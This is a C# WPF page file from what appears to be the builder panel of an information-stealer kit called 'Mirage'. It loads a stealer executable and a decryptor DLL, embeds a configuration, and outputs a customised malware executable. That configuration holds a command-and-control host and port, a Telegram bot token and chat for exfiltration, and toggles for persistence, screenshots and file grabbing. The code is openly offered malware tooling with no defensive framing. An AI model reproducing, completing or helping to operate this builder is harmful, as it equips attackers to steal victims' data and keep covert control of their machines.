using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using Mirage.Panel.Services;

namespace Mirage.Panel.Views;

public partial class BuildPage : Page
{
    private readonly BuildService _builder = new();
    private readonly ResourceExtractor _extractor;
    private string? _stealerPath;
    private string? _decryptorPath;

    public BuildPage(ResourceExtractor extractor)
    {
        InitializeComponent();
        _extractor = extractor;
    }

    private void SelectStealerClick(object sender, RoutedEventArgs e)
    {
        var dialog = new OpenFileDialog { Filter = "Executable|*.exe" };
        if (dialog.ShowDialog() == true)
        {
            _stealerPath = dialog.FileName;
            StealerPath.Text = System.IO.Path.GetFileName(_stealerPath);
        }
    }

    private void SelectDecryptorClick(object sender, RoutedEventArgs e)
    {
        var dialog = new OpenFileDialog { Filter = "DLL|*.dll" };
        if (dialog.ShowDialog() == true)
        {
            _decryptorPath = dialog.FileName;
            DecryptorPath.Text = System.IO.Path.GetFileName(_decryptorPath);
        }
    }

    private void BuildClick(object sender, RoutedEventArgs e)
    {
        byte[] stub;
        byte[]? dll = null;

        if (_stealerPath != null)
        {
            stub = System.IO.File.ReadAllBytes(_stealerPath);
        }
        else
        {
            stub = _extractor.ExtractStealer();
            StealerPath.Text = "Using embedded resource";
        }

        if (_decryptorPath != null)
        {
            dll = System.IO.File.ReadAllBytes(_decryptorPath);
        }
        else
        {
            try
            {
                dll = _extractor.ExtractDecryptor();
                DecryptorPath.Text = "Using embedded resource";
            }
            catch { }
        }

        var config = new BuildConfig
        {
            C2Host = C2Host.Text,
            C2Port = int.TryParse(C2Port.Text, out var p) ? p : 8443,
            TelegramToken = TelegramToken.Text,
            TelegramChatId = TelegramChatId.Text,
            EnablePersistence = EnablePersistence.IsChecked == true,
            EnableScreenshot = EnableScreenshot.IsChecked == true,
            EnableGrabber = EnableGrabber.IsChecked == true,
        };

        try
        {
            var result = _builder.Build(stub, dll, config);

            var saveDialog = new SaveFileDialog
            {
                Filter = "Executable|*.exe",
                FileName = "mirage_built.exe"
            };

            if (saveDialog.ShowDialog() == true)
            {
                System.IO.File.WriteAllBytes(saveDialog.FileName, result);
                StatusText.Text = $"Build completed — saved to {System.IO.Path.GetFileName(saveDialog.FileName)}";
            }
        }
        catch (Exception ex)
        {
            StatusText.Text = $"Error: {ex.Message}";
        }
    }
}
